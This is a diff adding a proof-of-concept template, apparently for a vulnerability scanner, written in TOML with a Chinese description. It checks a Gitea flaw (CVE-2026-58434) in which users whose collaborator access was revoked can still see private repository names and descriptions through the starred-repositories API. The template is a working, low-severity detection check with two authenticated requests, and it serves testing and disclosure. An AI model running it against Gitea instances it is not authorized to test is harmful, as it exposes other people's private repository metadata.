@@ -1,0 +1,44 @@
+[info]
+author = "ave"
+description = "验证已被撤销私有仓库协作者权限的用户，仍可通过 /api/v1/user/starred 端点获取该仓库元数据（名称、描述、可见性），同时确认直接访问已被拒绝（404）。需使用已验证曾拥有协作权限并已收藏目标仓库的账号 Token。"
+id = "POC-AVE-2026-0670"
+name = "Gitea 私有仓库元数据未同步授权撤销 PoC"
+severity = "low"
+tags = ["ave-2026-0670"]
+vuln_id = [
+    "CVE-2026-58434",
+    "AVE-2026-0670",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/api/v1/user/starred"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    '"full_name"',
+    '"private":true',
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/api/v1/repos/{{owner}}/{{repo}}"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [404]
+type = "status"
